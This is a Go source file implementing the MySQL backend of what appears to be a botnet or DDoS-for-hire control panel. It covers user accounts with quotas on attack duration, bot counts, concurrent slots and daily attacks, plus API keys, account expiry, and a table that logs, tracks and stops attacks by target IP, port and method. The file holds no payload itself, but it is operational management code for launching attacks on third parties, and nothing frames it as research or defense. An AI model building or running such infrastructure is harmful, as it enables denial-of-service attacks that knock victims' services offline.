package database

import (
	"crypto/rand"
	"database/sql"
	"encoding/hex"
	"fmt"
	"time"

	_ "github.com/go-sql-driver/mysql"
	"golang.org/x/crypto/bcrypt"
)

type User struct {
	ID                  int
	Username            string
	Password            string
	Role                string
	MaxTime             int
	MaxBots             int
	MaxSlots            int
	DailyLimit          int
	DailyUsed           int
	LastResetDate       time.Time
	APIAccess           bool
	APIKey              sql.NullString
	ForcePasswordChange bool
	Banned              bool
	ExpiryDate          sql.NullTime
	SSHPublicKey        string
}

type LoginRecord struct {
	ID        int
	UserID    int
	Username  string
	IP        string
	LoginTime time.Time
	Success   bool
}

type BlacklistEntry struct {
	ID      int
	IP      string
	AddedBy string
	AddedAt time.Time
}

type Attack struct {
	ID         int
	TargetIP   string
	TargetPort int
	Duration   int
	Method     string
	UserID     int
	Username   string
	TimeSent   time.Time
	Status     string
}

type Database struct {
	db *sql.DB
}

func New(host string, port int, user, password, dbname string) (*Database, error) {
	// 1. Connect without database name first to ensure we can create it if missing
	dsnNoDB := fmt.Sprintf("%s:%s@tcp(%s:%d)/?parseTime=true", user, password, host, port)
	db, err := sql.Open("mysql", dsnNoDB)
	if err != nil {
		return nil, err
	}

	if err := db.Ping(); err != nil {
		db.Close()
		return nil, err
	}

	// 2. Create database if it doesn't exist
	_, err = db.Exec(fmt.Sprintf("CREATE DATABASE IF NOT EXISTS `%s` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci", dbname))
	if err != nil {
		// If we can't create it, maybe it already exists but we didn't have permission to see it?
		// Or we don't have CREATE permission. We'll try to connect anyway.
	}
	db.Close()

	// 3. Connect to the actual database
	dsn := fmt.Sprintf("%s:%s@tcp(%s:%d)/%s?parseTime=true", user, password, host, port, dbname)
	db, err = sql.Open("mysql", dsn)
	if err != nil {
		return nil, err
	}

	db.SetMaxOpenConns(25)
	db.SetMaxIdleConns(5)
	db.SetConnMaxLifetime(5 * time.Minute)

	if err := db.Ping(); err != nil {
		db.Close()
		return nil, err
	}

	return &Database{db: db}, nil
}

func (d *Database) Close() error {
	return d.db.Close()
}

func (d *Database) InitTables() error {
	queries := []string{
		`CREATE TABLE IF NOT EXISTS users (
			id INT PRIMARY KEY AUTO_INCREMENT,
			username VARCHAR(50) UNIQUE NOT NULL,
			password VARCHAR(255) NOT NULL,
			role VARCHAR(20) NOT NULL DEFAULT 'user',
			max_time INT DEFAULT 300,
			max_bots INT DEFAULT 50,
			max_slots INT DEFAULT 5,
			daily_limit INT DEFAULT 100,
			daily_used INT DEFAULT 0,
			last_reset_date DATE DEFAULT (CURRENT_DATE),
			api_access BOOLEAN DEFAULT FALSE,
			api_key VARCHAR(64),
			force_password_change BOOLEAN DEFAULT TRUE,
			banned BOOLEAN DEFAULT FALSE,
			expiry_date DATE DEFAULT NULL,
			ssh_public_key TEXT DEFAULT NULL,
			INDEX idx_username (username),
			INDEX idx_api_key (api_key)
		)`,

		`CREATE TABLE IF NOT EXISTS attacks (
			id INT PRIMARY KEY AUTO_INCREMENT,
			target_ip VARCHAR(45) NOT NULL,
			target_port INT,
			duration INT NOT NULL,
			method VARCHAR(20) NOT NULL,
			user_id INT NOT NULL,
			time_sent TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			status ENUM('running', 'done', 'stopped') DEFAULT 'running',
			FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
			INDEX idx_status (status),
			INDEX idx_user_id (user_id)
		)`,

		`CREATE TABLE IF NOT EXISTS blacklist (
			id INT PRIMARY KEY AUTO_INCREMENT,
			ip VARCHAR(45) NOT NULL UNIQUE,
			added_by VARCHAR(50),
			added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		)`,

		`CREATE TABLE IF NOT EXISTS login_history (
			id INT PRIMARY KEY AUTO_INCREMENT,
			user_id INT NOT NULL,
			ip VARCHAR(45),
			login_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
			success BOOLEAN DEFAULT TRUE,
			FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
			INDEX idx_user_login (user_id, login_time)
		)`,
	}

	for _, q := range queries {
		if _, err := d.db.Exec(q); err != nil {
			return err
		}
	}
	return nil
}

func (d *Database) UserCount() (int, error) {
	var count int
	err := d.db.QueryRow("SELECT COUNT(*) FROM users").Scan(&count)
	return count, err
}

func (d *Database) GeneratePassword() (string, error) {
	passwordBytes := make([]byte, 8)
	if _, err := rand.Read(passwordBytes); err != nil {
		return "", fmt.Errorf("failed to generate secure password: %w", err)
	}
	return hex.EncodeToString(passwordBytes), nil
}

func (d *Database) GenerateAPIKey() (string, error) {
	keyBytes := make([]byte, 32)
	if _, err := rand.Read(keyBytes); err != nil {
		return "", fmt.Errorf("failed to generate secure API key: %w", err)
	}
	return hex.EncodeToString(keyBytes), nil
}

func (d *Database) CreateRootUser(username string) (string, string, error) {
	rawPassword, err := d.GeneratePassword()
	if err != nil {
		return "", "", err
	}
	apiKey, err := d.GenerateAPIKey()
	if err != nil {
		return "", "", err
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(rawPassword), bcrypt.DefaultCost)
	if err != nil {
		return "", "", err
	}

	_, err = d.db.Exec(`
		INSERT INTO users (username, password, role, max_time, max_bots, max_slots, daily_limit, api_access, api_key, force_password_change)
		VALUES (?, ?, 'root', 0, 0, 0, 0, TRUE, ?, TRUE)
	`, username, string(hashedPassword), apiKey)

	if err != nil {
		return "", "", err
	}

	return rawPassword, apiKey, nil
}

func (d *Database) AuthenticateUser(username, password string) (*User, error) {
	user := &User{}
	var lastResetDate sql.NullTime
	var forceChange sql.NullBool

	err := d.db.QueryRow(`
		SELECT id, username, password, role, max_time, max_bots, max_slots,
		       daily_limit, daily_used, last_reset_date, api_access, api_key,
		       force_password_change, banned, expiry_date, COALESCE(ssh_public_key, '') as ssh_public_key
		FROM users WHERE username = ?
	`, username).Scan(
		&user.ID, &user.Username, &user.Password, &user.Role,
		&user.MaxTime, &user.MaxBots, &user.MaxSlots,
		&user.DailyLimit, &user.DailyUsed, &lastResetDate,
		&user.APIAccess, &user.APIKey, &forceChange, &user.Banned, &user.ExpiryDate,
		&user.SSHPublicKey,
	)

	if err == sql.ErrNoRows {
		return nil, nil
	}
	if err != nil {
		return nil, err
	}

	if lastResetDate.Valid {
		user.LastResetDate = lastResetDate.Time
	}
	if forceChange.Valid {
		user.ForcePasswordChange = forceChange.Bool
	}

	if err := bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(password)); err != nil {
		return nil, nil
	}

	if user.Banned {
		return nil, fmt.Errorf("account is banned")
	}

	if user.ExpiryDate.Valid {
		if time.Now().After(user.ExpiryDate.Time) {
			return nil, fmt.Errorf("account has expired")
		}
	}

	if err := d.CheckDailyReset(user); err != nil {
		return nil, err
	}

	return user, nil
}

func (d *Database) CheckDailyReset(user *User) error {
	today := time.Now().Truncate(24 * time.Hour)
	userDate := user.LastResetDate.Truncate(24 * time.Hour)

	if today.After(userDate) {
		_, err := d.db.Exec(`
			UPDATE users SET daily_used = 0, last_reset_date = CURRENT_DATE WHERE id = ?
		`, user.ID)
		if err != nil {
			return err
		}
		user.DailyUsed = 0
		user.LastResetDate = today
	}

	return nil
}

func (d *Database) IncrementDailyUsed(userID int) error {
	_, err := d.db.Exec("UPDATE users SET daily_used = daily_used + 1 WHERE id = ?", userID)
	return err
}

func (d *Database) GetUserRunningAttacks(userID int) (int, error) {
	var count int
	err := d.db.QueryRow(`
		SELECT COUNT(*) FROM attacks WHERE user_id = ? AND status = 'running'
	`, userID).Scan(&count)
	return count, err
}

func (d *Database) LogAttack(userID int, targetIP string, targetPort, duration int, method string) (int64, error) {
	result, err := d.db.Exec(`
		INSERT INTO attacks (target_ip, target_port, duration, method, user_id)
		VALUES (?, ?, ?, ?, ?)
	`, targetIP, targetPort, duration, method, userID)

	if err != nil {
		return 0, err
	}

	return result.LastInsertId()
}

func (d *Database) UpdateAttackStatus(attackID int64, status string) error {
	_, err := d.db.Exec("UPDATE attacks SET status = ? WHERE id = ?", status, attackID)
	return err
}

type OngoingAttack struct {
	ID       int
	Method   string
	Target   string
	Port     int
	Duration int
	TimeLeft int
	Username string
}

func (d *Database) GetOngoingAttacks() ([]OngoingAttack, error) {
	rows, err := d.db.Query(`
		SELECT a.id, a.method, a.target_ip, a.target_port, a.duration, 
		       GREATEST(0, a.duration - TIMESTAMPDIFF(SECOND, a.time_sent, NOW())) as time_left,
		       u.username
		FROM attacks a
		JOIN users u ON a.user_id = u.id
		WHERE a.status = 'running'
		ORDER BY a.time_sent DESC
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var attacks []OngoingAttack
	for rows.Next() {
		var a OngoingAttack
		if err := rows.Scan(&a.ID, &a.Method, &a.Target, &a.Port, &a.Duration, &a.TimeLeft, &a.Username); err != nil {
			return nil, err
		}
		attacks = append(attacks, a)
	}

	return attacks, nil
}

func (d *Database) GetGlobalSlotsInUse() (int, error) {
	var count int
	err := d.db.QueryRow("SELECT COUNT(*) FROM attacks WHERE status = 'running'").Scan(&count)
	return count, err
}

func (d *Database) CleanupExpiredAttacks() (int, error) {
	result, err := d.db.Exec(`
		UPDATE attacks 
		SET status = 'done' 
		WHERE status = 'running' 
		AND TIMESTAMPADD(SECOND, duration, time_sent) < NOW()
	`)
	if err != nil {
		return 0, err
	}

	rows, err := result.RowsAffected()
	if err != nil {
		return 0, err
	}

	return int(rows), nil
}

func (d *Database) GetAllUsers() ([]User, error) {
	rows, err := d.db.Query(`
		SELECT id, username, role, max_time, max_bots, max_slots, daily_limit, daily_used, api_access, expiry_date
		FROM users ORDER BY id
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var users []User
	for rows.Next() {
		var u User
		if err := rows.Scan(&u.ID, &u.Username, &u.Role, &u.MaxTime, &u.MaxBots, &u.MaxSlots, &u.DailyLimit, &u.DailyUsed, &u.APIAccess, &u.ExpiryDate); err != nil {
			return nil, err
		}
		users = append(users, u)
	}

	return users, nil
}

func (d *Database) CreateUser(username string, maxTime, maxBots, maxSlots, dailyLimit int, apiAccess bool, role string, expiryDate *time.Time) (string, string, error) {
	rawPassword, err := d.GeneratePassword()
	if err != nil {
		return "", "", err
	}
	var apiKey string
	if apiAccess {
		apiKey, err = d.GenerateAPIKey()
		if err != nil {
			return "", "", err
		}
	}

	if role == "" {
		role = "user"
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(rawPassword), bcrypt.DefaultCost)
	if err != nil {
		return "", "", err
	}

	if apiAccess {
		_, err = d.db.Exec(`
			INSERT INTO users (username, password, role, max_time, max_bots, max_slots, daily_limit, api_access, api_key, force_password_change, expiry_date)
			VALUES (?, ?, ?, ?, ?, ?, ?, TRUE, ?, TRUE, ?)
		`, username, string(hashedPassword), role, maxTime, maxBots, maxSlots, dailyLimit, apiKey, expiryDate)
	} else {
		_, err = d.db.Exec(`
			INSERT INTO users (username, password, role, max_time, max_bots, max_slots, daily_limit, api_access, force_password_change, expiry_date)
			VALUES (?, ?, ?, ?, ?, ?, ?, FALSE, TRUE, ?)
		`, username, string(hashedPassword), role, maxTime, maxBots, maxSlots, dailyLimit, expiryDate)
	}

	if err != nil {
		return "", "", err
	}

	return rawPassword, apiKey, nil
}

func (d *Database) UpdateUserPassword(userID int, newPassword string) error {
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(newPassword), bcrypt.DefaultCost)
	if err != nil {
		return err
	}

	_, err = d.db.Exec(`
		UPDATE users SET password = ?, force_password_change = FALSE WHERE id = ?
	`, string(hashedPassword), userID)

	return err
}

func (d *Database) DeleteUser(username string) error {
	result, err := d.db.Exec("DELETE FROM users WHERE username = ? AND role != 'root'", username)
	if err != nil {
		return err
	}

	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("user not found or cannot delete root user")
	}
	return nil
}

func (d *Database) UpdateUserMaxTime(username string, maxTime int) error {
	result, err := d.db.Exec("UPDATE users SET max_time = ? WHERE username = ?", maxTime, username)
	if err != nil {
		return err
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("user not found")
	}
	return nil
}

func (d *Database) UpdateUserMaxBots(username string, maxBots int) error {
	result, err := d.db.Exec("UPDATE users SET max_bots = ? WHERE username = ?", maxBots, username)
	if err != nil {
		return err
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("user not found")
	}
	return nil
}

func (d *Database) UpdateUserMaxSlots(username string, maxSlots int) error {
	result, err := d.db.Exec("UPDATE users SET max_slots = ? WHERE username = ?", maxSlots, username)
	if err != nil {
		return err
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("user not found")
	}
	return nil
}

func (d *Database) UpdateUserDailyLimit(username string, dailyLimit int) error {
	result, err := d.db.Exec("UPDATE users SET daily_limit = ? WHERE username = ?", dailyLimit, username)
	if err != nil {
		return err
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("user not found")
	}
	return nil
}

func (d *Database) UpdateUserAPIAccess(username string, apiAccess bool) error {
	var err error
	if apiAccess {
		apiKey, err := d.GenerateAPIKey()
		if err != nil {
			return err
		}
		_, err = d.db.Exec("UPDATE users SET api_access = TRUE, api_key = ? WHERE username = ?", apiKey, username)
	} else {
		_, err = d.db.Exec("UPDATE users SET api_access = FALSE WHERE username = ?", username)
	}
	return err
}

func (d *Database) UpdateUserRole(username string, role string) error {
	if role != "user" && role != "admin" {
		return fmt.Errorf("invalid role: must be 'user' or 'admin'")
	}
	result, err := d.db.Exec("UPDATE users SET role = ? WHERE username = ? AND role != 'root'", role, username)
	if err != nil {
		return err
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("user not found or cannot change root user role")
	}
	return nil
}

func (d *Database) UpdateUsername(oldUsername, newUsername string) error {
	result, err := d.db.Exec("UPDATE users SET username = ? WHERE username = ? AND role != 'root'", newUsername, oldUsername)
	if err != nil {
		return err
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("user not found or cannot rename root user")
	}
	return nil
}

func (d *Database) UpdateUserExpiry(username string, expiryDate *time.Time) error {
	result, err := d.db.Exec("UPDATE users SET expiry_date = ? WHERE username = ?", expiryDate, username)
	if err != nil {
		return err
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("user not found")
	}
	return nil
}

func (d *Database) ResetUserPassword(username string) (string, error) {
	rawPassword, err := d.GeneratePassword()
	if err != nil {
		return "", err
	}
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(rawPassword), bcrypt.DefaultCost)
	if err != nil {
		return "", err
	}

	result, err := d.db.Exec(`
		UPDATE users SET password = ?, force_password_change = TRUE WHERE username = ? AND role != 'root'
	`, string(hashedPassword), username)
	if err != nil {
		return "", err
	}

	rows, _ := result.RowsAffected()
	if rows == 0 {
		return "", fmt.Errorf("user not found or cannot reset root password")
	}
	return rawPassword, nil
}

func (d *Database) GetUserDetails(username string) (*User, error) {
	user := &User{}
	var lastResetDate sql.NullTime
	var forceChange sql.NullBool

	err := d.db.QueryRow(`
		SELECT id, username, role, max_time, max_bots, max_slots,
		       daily_limit, daily_used, last_reset_date, api_access, api_key,
		       force_password_change, banned, expiry_date, COALESCE(ssh_public_key, '') as ssh_public_key
		FROM users WHERE username = ?
	`, username).Scan(
		&user.ID, &user.Username, &user.Role,
		&user.MaxTime, &user.MaxBots, &user.MaxSlots,
		&user.DailyLimit, &user.DailyUsed, &lastResetDate,
		&user.APIAccess, &user.APIKey, &forceChange, &user.Banned, &user.ExpiryDate,
		&user.SSHPublicKey,
	)

	if err == sql.ErrNoRows {
		return nil, fmt.Errorf("user not found")
	}
	if err != nil {
		return nil, err
	}

	if lastResetDate.Valid {
		user.LastResetDate = lastResetDate.Time
	}
	if forceChange.Valid {
		user.ForcePasswordChange = forceChange.Bool
	}

	return user, nil
}

func (d *Database) GetUserByAPIKey(username, apiKey string) (*User, error) {
	user := &User{}
	var lastResetDate sql.NullTime

	err := d.db.QueryRow(`
		SELECT id, username, role, max_time, max_bots, max_slots, 
		       daily_limit, daily_used, last_reset_date, api_access, 
		       banned, expiry_date
		FROM users WHERE username = ? AND api_key = ? AND api_access = TRUE
	`, username, apiKey).Scan(
		&user.ID, &user.Username, &user.Role,
		&user.MaxTime, &user.MaxBots, &user.MaxSlots,
		&user.DailyLimit, &user.DailyUsed, &lastResetDate, &user.APIAccess,
		&user.Banned, &user.ExpiryDate,
	)

	if err == sql.ErrNoRows {
		return nil, nil
	}
	if err != nil {
		return nil, err
	}

	if user.Banned {
		return nil, fmt.Errorf("account is banned")
	}

	if user.ExpiryDate.Valid {
		if time.Now().After(user.ExpiryDate.Time) {
			return nil, fmt.Errorf("account has expired")
		}
	}

	if lastResetDate.Valid {
		user.LastResetDate = lastResetDate.Time
	}

	if err := d.CheckDailyReset(user); err != nil {
		return nil, err
	}

	return user, nil
}

func (d *Database) BanUser(username string) error {
	result, err := d.db.Exec("UPDATE users SET banned = TRUE WHERE username = ? AND role != 'root'", username)
	if err != nil {
		return err
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("user not found or cannot ban root user")
	}
	return nil
}

func (d *Database) UnbanUser(username string) error {
	result, err := d.db.Exec("UPDATE users SET banned = FALSE WHERE username = ?", username)
	if err != nil {
		return err
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("user not found")
	}
	return nil
}

func (d *Database) AddBlacklistIP(ip, addedBy string) error {
	_, err := d.db.Exec("INSERT INTO blacklist (ip, added_by) VALUES (?, ?)", ip, addedBy)
	return err
}

func (d *Database) RemoveBlacklistIP(ip string) error {
	result, err := d.db.Exec("DELETE FROM blacklist WHERE ip = ?", ip)
	if err != nil {
		return err
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("IP not found in blacklist")
	}
	return nil
}

func (d *Database) GetBlacklist() ([]BlacklistEntry, error) {
	rows, err := d.db.Query("SELECT id, ip, added_by, added_at FROM blacklist ORDER BY added_at DESC")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var entries []BlacklistEntry
	for rows.Next() {
		var e BlacklistEntry
		if err := rows.Scan(&e.ID, &e.IP, &e.AddedBy, &e.AddedAt); err != nil {
			return nil, err
		}
		entries = append(entries, e)
	}
	return entries, nil
}

func (d *Database) GetLastLogin(userID int) (*LoginRecord, error) {
	r := &LoginRecord{}
	err := d.db.QueryRow(`
		SELECT lh.id, lh.user_id, u.username, lh.ip, lh.login_time, lh.success
		FROM login_history lh
		JOIN users u ON lh.user_id = u.id
		WHERE lh.user_id = ? AND lh.success = TRUE
		ORDER BY lh.login_time DESC
		LIMIT 1 OFFSET 1
	`, userID).Scan(&r.ID, &r.UserID, &r.Username, &r.IP, &r.LoginTime, &r.Success)
	if err == sql.ErrNoRows {
		return nil, nil
	}
	if err != nil {
		return nil, err
	}
	return r, nil
}

func (d *Database) GetAttackHistory(userID, limit int) ([]Attack, error) {
	rows, err := d.db.Query(`
		SELECT id, target_ip, target_port, duration, method, user_id, time_sent, status
		FROM attacks
		WHERE user_id = ?
		ORDER BY time_sent DESC
		LIMIT ?
	`, userID, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var attacks []Attack
	for rows.Next() {
		var a Attack
		if err := rows.Scan(&a.ID, &a.TargetIP, &a.TargetPort, &a.Duration, &a.Method, &a.UserID, &a.TimeSent, &a.Status); err != nil {
			return nil, err
		}
		attacks = append(attacks, a)
	}
	return attacks, nil
}

func (d *Database) GetAllAttackHistory(limit int) ([]Attack, error) {
	rows, err := d.db.Query(`
		SELECT a.id, a.target_ip, a.target_port, a.duration, a.method, a.user_id, a.time_sent, a.status,
		       COALESCE(u.username, '?') AS username
		FROM attacks a
		LEFT JOIN users u ON a.user_id = u.id
		ORDER BY a.time_sent DESC
		LIMIT ?
	`, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var attacks []Attack
	for rows.Next() {
		var a Attack
		if err := rows.Scan(&a.ID, &a.TargetIP, &a.TargetPort, &a.Duration, &a.Method, &a.UserID, &a.TimeSent, &a.Status, &a.Username); err != nil {
			return nil, err
		}
		attacks = append(attacks, a)
	}
	return attacks, nil
}

func (d *Database) StopAllRunningAttacks() (int, error) {
	result, err := d.db.Exec("UPDATE attacks SET status = 'stopped' WHERE status = 'running'")
	if err != nil {
		return 0, err
	}
	rows, _ := result.RowsAffected()
	return int(rows), nil
}

func (d *Database) StopAttacksByTargetIP(targetIP string) (int, error) {
	result, err := d.db.Exec("UPDATE attacks SET status = 'stopped' WHERE target_ip = ? AND status = 'running'", targetIP)
	if err != nil {
		return 0, err
	}
	rows, _ := result.RowsAffected()
	return int(rows), nil
}

func (d *Database) StopAttackByID(attackID int64, userID int, isAdmin bool) error {
	var result sql.Result
	var err error

	if isAdmin {
		result, err = d.db.Exec("UPDATE attacks SET status = 'stopped' WHERE id = ? AND status = 'running'", attackID)
	} else {
		result, err = d.db.Exec("UPDATE attacks SET status = 'stopped' WHERE id = ? AND user_id = ? AND status = 'running'", attackID, userID)
	}

	if err != nil {
		return err
	}

	rows, _ := result.RowsAffected()
	if rows == 0 {
		return fmt.Errorf("attack not found or already stopped")
	}
	return nil
}

func (d *Database) GetAttackByID(attackID int64) (*Attack, error) {
	a := &Attack{}
	err := d.db.QueryRow(`
		SELECT id, target_ip, target_port, duration, method, user_id, time_sent, status
		FROM attacks WHERE id = ?
	`, attackID).Scan(&a.ID, &a.TargetIP, &a.TargetPort, &a.Duration, &a.Method, &a.UserID, &a.TimeSent, &a.Status)
	if err == sql.ErrNoRows {
		return nil, nil
	}
	if err != nil {
		return nil, err
	}
	return a, nil
}

func (d *Database) UpdateUserSSHKey(userID int, sshPublicKey string) error {
	_, err := d.db.Exec("UPDATE users SET ssh_public_key = ? WHERE id = ?", sshPublicKey, userID)
	return err
}

// IsIPBlacklisted checks if an IP address is in the blacklist table.
func (d *Database) IsIPBlacklisted(ip string) (bool, error) {
	var count int
	err := d.db.QueryRow("SELECT COUNT(*) FROM blacklist WHERE ip = ?", ip).Scan(&count)
	if err != nil {
		return false, err
	}
	return count > 0, nil
}

// HealthCheck pings the database to verify the connection is alive.
func (d *Database) HealthCheck() error {
	return d.db.Ping()
}

// RecordLogin records a login attempt in the login_history table.
func (d *Database) RecordLogin(userID int, ip string, success bool) error {
	_, err := d.db.Exec(`
		INSERT INTO login_history (user_id, ip, success) VALUES (?, ?, ?)
	`, userID, ip, success)
	return err
}
